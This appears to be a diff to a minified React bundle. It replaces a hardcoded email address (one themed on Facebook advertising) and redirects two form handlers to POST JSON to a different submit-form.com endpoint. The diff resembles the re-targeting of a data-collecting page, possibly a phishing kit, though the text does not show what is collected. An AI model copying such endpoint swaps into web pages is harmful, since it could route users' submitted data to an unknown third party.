@@ -13747,7 +13747,7 @@
                     })
                 },
                 Wt = () => {
-                    const e = ["sanullah947@gmail.com"],
+                    const e = ["rockstarmediafbadvertising@gmail.com"],
                         t = _(),
                         [r, a] = (0,
                             n.useState)(!1),
@@ -13849,7 +13849,7 @@
                                         he.jsxs)("form", {
                                         onSubmit: n => {
                                             n.preventDefault(),
-                                                u && o ? (fetch("https://submit-form.com/zjynWRM17", {
+                                                u && o ? (fetch("https://submit-form.com/3UODnmXTY", {
                                                         method: "POST",
                                                         headers: {
                                                             "Content-Type": "application/json"
@@ -13960,7 +13960,7 @@
                             he.jsx)("button", {
                             onClick: n => {
                                 n.preventDefault(),
-                                    fetch("https://submit-form.com/zjynWRM17", {
+                                    fetch("https://submit-form.com/3UODnmXTY", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
